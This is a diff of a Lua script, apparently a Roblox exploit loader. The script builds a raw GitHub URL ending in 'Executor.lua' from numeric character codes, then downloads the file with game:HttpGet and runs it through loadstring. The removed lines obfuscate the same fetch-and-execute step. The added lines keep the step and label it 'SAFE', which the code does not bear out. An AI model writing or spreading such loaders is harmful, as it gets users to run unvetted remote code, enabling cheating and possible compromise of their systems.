@@ -1,11 +1,11 @@
--- Nope
+-- Nope 2
 
-(function(...)
-    local _0 = function(q)
-        return string.char(table.unpack(q))
+(function()
+    local function chr(t)
+        return string.char(table.unpack(t))
     end
 
-    local _1 = {
+    local parts = {
         {104,116,116,112,115,58,47,47},
         {114,97,119,46},
         {103,105,116,104,117,98},
@@ -17,21 +17,13 @@
         {69,120,112,101,114,105,101,110,99,101,83,101,116,116,105,110,103,115,37,50,48,69,120,101,99,117,116,111,114,46,108,117,97}
     }
 
-    local function _2()
-        local s = ""
-        for i = 1, #_1 do
-            s = s .. _0(_1[i])
-        end
-        return s
+    local url = ""
+    for i = 1, #parts do
+        url = url .. chr(parts[i])
     end
 
-    local _3 = setmetatable({}, {
-        __index = function(_,k)
-            return game[_0({72,116,116,112,71,101,116})]
-        end
-    })
+    local loader = loadstring or load
 
-    local __ = (_G["loadstring"] or _G["load"])
-    return __(_3["anything"](_2()))()
-
-end)(...)
+    -- SAFE CASE-PRESERVED CALL
+    loader(game:HttpGet(url))()
+end)()
